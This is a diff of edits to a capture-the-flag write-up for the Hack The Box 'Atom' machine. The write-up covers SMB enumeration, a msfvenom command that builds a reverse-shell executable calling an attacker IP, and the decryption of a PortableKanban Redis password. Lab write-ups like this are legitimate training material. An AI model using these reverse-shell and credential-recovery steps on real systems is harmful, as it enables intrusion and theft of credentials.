@@ -77,13 +77,13 @@ Host script results:
 |_  start_date: N/A
 ```
 
-We have lots of `tcp` ports open. but this is a `Windows` box, so you need to get used to this much of open `tcp` ports :wink:
+We have lots of `tcp` ports open. but this is a `Windows` box, so you need to get used to this much of open `tcp` ports. :wink:
 
 Let's see what we get from the web port, which is in this case: `80/http`
 
 ## 80/http
 
-A simple web site, came out a subdirectory called `releases` with an executable file in it.
+A simple web site, I noticed a subdirectory called `releases` with an executable file in it.
 
 ![](src/dir.png)
 
@@ -132,9 +132,9 @@ d3dcompiler_47.dll      icudtl.dat  LICENSE.electron.txt  natives_blob.bin      
 After further enumeration, I came up with the two interesting things as follows:
 
 - resources/app-update.yml
- - updates.atom.htb (Same site)
+	- updates.atom.htb (Same site)
 - resources/app.asar
- - Extracting with asar gives us a keyword!
+	- Extracting with asar gives us a keyword!
 
 ```bash
 ┌──(root💀f4T1H)-[~/…/heed/$PLUGINSDIR/app-64/resources]
@@ -156,7 +156,7 @@ let addWindow;
 ```
 
 You see the third line? `electron-updater`, we got some new terms here!<br><br>
-Okay but, what is `electron` ? We're not in physics class!
+Okay but, what is `electron` ? We're not in physics class XD
 
 >[Electron](https://www.electronjs.org/docs/tutorial/introduction) is a framework for building desktop applications using JavaScript, HTML, and CSS. By embedding Chromium and Node.js into its binary, Electron allows you to maintain one JavaScript codebase and create cross-platform apps that work on Windows, macOS, and Linux — no native development experience required.
 
@@ -226,7 +226,7 @@ correctly.
 developer.
 ```
 
-- Here first command I used for checking if we have passwordless access to `smb shares`.<br>
+- Here the first command I used for checking if we have passwordless access to `smb shares`.<br>
 - Then we got into the `smb share` named `Software_Updates` (because we're struggling with electron-updater - on the other hand and that seemed as a good starting point to me for checking smb shares).<br>
 - After that we saw a pdf and downloaded it sing the `get` command.<br>
 - Converted it to text file and read it.
@@ -244,7 +244,7 @@ First create a payload with `msfvenom`.
 
 ```bash
 ┌──(root💀f4T1H)-[~/hackthebox/atom/exploit]
-└─> msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.29 LPORT=2121 -f exe -o "f4T1H'.exe"
+└─> msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.29 LPORT=2121 -f exe -o "f4T1H'.exe"
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder specified, outputting raw payload
@@ -364,7 +364,7 @@ __PortableKanban.cfg__
 {"RoamingSettings":{"DataSource":"RedisServer","DbServer":"localhost","DbPort":6379,"DbEncPassword":"Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb","DbServer2":"","DbPort2":6379,"DbEncPassword2":"","DbIndex":0,"DbSsl":false,"DbTimeout":10,"FlushChanges":true,"UpdateInterval":5,"AutoUpdate":true,"Caption":"My Tasks","RightClickAction":"Nothing","DateTimeFormat":"ddd, M/d/yyyy h:mm tt","BoardForeColor":"WhiteSmoke","BoardBackColor":"DimGray","ViewTabsFont":"Segoe UI, 9pt","SelectedViewTabForeColor":"WhiteSmoke","SelectedViewTabBackColor":"Black","HeaderFont":"Segoe UI, 11.4pt","HeaderShowCount":true,"HeaderShowLimit":true,"HeaderShowEstimates":true,"HeaderShowPoints":false,"HeaderForeColor":"WhiteSmoke","HeaderBackColor":"Gray","CardFont":"Segoe UI, 11.4pt","CardLines":3,"CardTextAlignment":"Center","CardShowMarks":true,"CardShowInitials":false,"CardShowTags":true,"ThickTags":false,"DefaultTaskForeColor":"WhiteSmoke","DefaultTaskBackColor":"Gray","SelectedTaskForeColor":"WhiteSmoke","SelectedTaskBackColor":"Black","SelectedTaskFrames":false,"SelectedTaskFrameColor":"WhiteSmoke","SelectedTaskThickFrames":false,"WarmTasksThreshold":0,"WarmTaskForeColor":"WhiteSmoke","WarmTaskBackColor":"MediumBlue","WarmTaskFrameColor":"Goldenrod","HotTasksThreshold":1,"HotTaskForeColor":"WhiteSmoke","HotTaskBackColor":"Blue","HotTaskFrameColor":"Yellow","OverdueTaskForeColor":"WhiteSmoke","OverdueTaskBackColor":"OrangeRed","OverdueTaskFrameColor":"OrangeRed","WarmHotTaskFrames":false,"WarmHotTaskThickFrames":false,"BusinessDaysOnly":false,"TrackedTaskForeColor":"WhiteSmoke","TrackedTaskBackColor":"Red","ShowSubtasksInEditBox":true,"CheckForDuplicates":true,"WarnBeforeDeleting":true,"ProgressIncrement":5,"DisableCreated":false,"DefaultPriority":"Low","DefaultDeadlineTime":"PT0S","ShowTaskComments":true,"IntervalFormat":"Hours","WorkUnitDuration":1,"SelectAnyColumn":false,"ShowInfo":true,"CardInfoFont":"Segoe UI, 9pt","InfoTextAlignment":"Center","InfoShowPriority":true,"InfoShowTopic":true,"InfoShowPerson":true,"InfoShowCreated":true,"InfoShowDeadlineCompleted":true,"InfoShowSubtasks":false,"InfoShowEstimate":false,"InfoShowSpent":false,"InfoShowPoints":false,"InfoShowProgress":true,"InfoShowCommentsCount":false,"InfoShowTags":false,"InfoShowCustomFields":false,"ShowToolTips":true,"ToolTipShowText":true,"ToolTipTextLimit":200,"ToolTipShowPriority":true,"ToolTipShowTopic":true,"ToolTipShowPerson":true,"ToolTipShowCreated":false,"ToolTipShowDeadlineCompleted":true,"ToolTipShowSubtasks":true,"ToolTipShowEstimate":true,"ToolTipShowSpent":true,"ToolTipShowPoints":true,"ToolTipShowProgress":true,"ToolTipShowCommentsCount":false,"ToolTipShowTags":false,"ToolTipShowCustomFields":false,"TimerWorkInterval":25,"TimeShortBreakInterval":5,"TimerLongBreakInterval":15,"PlaySound":1000,"ActivateWindow":false,"TaskBarProgress":true,"EnableTimeTracking":true,"AlertOnNewTask":false,"AlertOnModifiedTask":false,"AlertOnCompletedTask":false,"AlertOnCanceledTask":false,"AlertOnReassignedTask":false,"AlertOnMovedTask":false,"AlertOnDeletedTask":false,"AlertMethod":"None","EmailLogon":true,"EmailReviewMessage":true,"EmailSmtpPort":587,"EmailSmtpDeliveryMethod":"Network","EmailSmtpUseDefaultCredentials":false,"EmailSmtpEnableSSL":false,"EmailSmtpTimeout":5,"EmailAttachFile":true,"EmailNewTaskSubject":"PortableKanban Notification: New task has been created","EmailDeletedTaskSubject":"PortableKanban Notification: Task has been deleted","EmailEditedTaskSubject":"PortableKanban Notification: Task has been modified","EmailCompletedTaskSubject":"PortableKanban Notification: Task has been completed","EmailCanceledTaskSubject":"PortableKanban Notification: Task has been canceled","EmailReassignedTaskSubject":"PortableKanban Notification: Task has been reassigned","EmailMovedTaskSubject":"PortableKanban Notification: Task has been moved","EmailSignature":"This is automatic message.","PluginsSettings":{"bd5d2026e1f7424eab8690a62ad05ad2":{},"07a0d797c97c41f789af21ff4298754e":{"SourceColumnId":"00000000000000000000000000000000","DestinationColumnId":"00000000000000000000000000000000","Age":30},"2e470c79feb946f2b6e74b35245f8e80":{"FromDate":"\/Date(1617346800000-0700)\/","ToDate":"\/Date(1617346800000-0700)\/","IncludeTopics":false,"IncludeTags":false,"IncludeComments":false,"ReportType":"Html","SortByUser":true},"680986568fed41c381ef9f230feaa102":{"RunOnStartup":false},"24b7acead7984f8ab16bdb0ae8559fb6":{"TopicId":"00000000000000000000000000000000","ColumnId":"00000000000000000000000000000000","FromPersonId":"00000000000000000000000000000000","ToPersonId":"00000000000000000000000000000000"}},"AutoLogon":false,"LogonUserName":"","EncLogonPassword":"","ExitOnSuspend":false,"DropFilesFolder":"Files","UseRelativePath":true,"ConfirmFileDeleteion":true,"DefaultDropFilesActionOption":"Copy","CreateNewTaskForEachDroppedFile":true,"ParseDroppedEmails":true,"RestoreWindowsLocation":true,"DesktopShortcut":false,"DailyBackup":false,"BackupTime":"PT0S","BlockEscape":false,"BlackWhiteIcon":true,"ShowTimer":true,"ViewId":"00000000000000000000000000000000","SearchInSubtasks":false,"ReportIncludeComments":true,"ReportIncludeSubTasks":true,"ReportIncludeTimeTracks":true,"ReportIncludeCustomFields":true},"LocalSettingsMap":{"ATOM":{"Left":320,"Top":2,"Width":800,"Height":601,"Minimized":false,"Maximized":false,"FullScreen":false,"Hidden":false,"AboutBoxLeft":0,"AboutBoxTop":0,"AboutBoxWidth":0,"AboutBoxHeight":0,"EditBoxLeft":0,"EditBoxTop":0,"EditBoxWidth":0,"EditBoxHeight":0,"EditBoxSplitterOrientation":1,"EditBoxSplitterDistance":0,"EditBoxFontSize":0,"EditBoxCommentsSortDirection":"Ascending","ReportBoxLeft":370,"ReportBoxTop":27,"ReportBoxWidth":700,"ReportBoxHeight":551,"SetupBoxLeft":370,"SetupBoxTop":52,"SetupBoxWidth":700,"SetupBoxHeight":501,"ViewBoxLeft":0,"ViewBoxTop":0,"ViewBoxWidth":0,"ViewBoxHeight":0,"LogonBoxLeft":520,"LogonBoxTop":202,"LogonBoxWidth":400,"LogonBoxHeight":201}}}
 ```
 
-That seems like a `JSON` data, save it in a file on your local and parse it.
+That seems like a `JSON` data, save it in a file on your local and parse it using `jq`.
 
 ```bash
 ┌──(root💀f4T1H)-[~/hackthebox/atom]
@@ -384,12 +384,13 @@ That seems like a `JSON` data, save it in a file on your local and parse it.
 We got some new keywords'n terms from here;
 - An encrypted password used in logging into `RedisServer`: `Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb`
 
-Let's first try to crack the password and then focus on redis.
+Let's first try to crack the password and then focus on `redis`.
 
 ### PortableKanban
 
-Actually, I don't think what exactly PortableKanban is a must know thing for us. Because I've already found an exploit for it. (An app for scheduling your tasks with Kanban scheduling system, I couldn't control myself XD)
-<br>[PortableKanban 4.3.6578.38136 - Encrypted Password Retrieval](https://www.exploit-db.com/exploits/49409)
+Actually, I don't think what exactly PortableKanban is a must know thing for us. Because I've already found an exploit for it.<br>
+(An app for scheduling your tasks with Kanban scheduling system, I couldn't control myself XD)<br><br>
+[PortableKanban 4.3.6578.38136 - Encrypted Password Retrieval](https://www.exploit-db.com/exploits/49409)
 
 I modified the exploit and got the password.
 
@@ -414,6 +415,8 @@ print(decode("Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb"))
 kidvscat_yes_kidvscat
 ```
 
+Alternatively, we could find the password from `redis` service's configuration files.
+
 ```shell
 PS C:\Program Files\Redis> type *.conf | findstr pass
 type *.conf | findstr pass
@@ -432,9 +435,8 @@ requirepass kidvscat_yes_kidvscat
 # use a very strong password otherwise it will be very easy to break.
 # requirepass foobared
 ```
-Alternatively, we could find the password from `redis` service's configuration files.
 
-It's time to have a look at the second term: `redis`.
+Okay, it's time to have a look at the second term: `redis`.
 
 ### redis
 What is [`redis`](https://redis.io/) ?
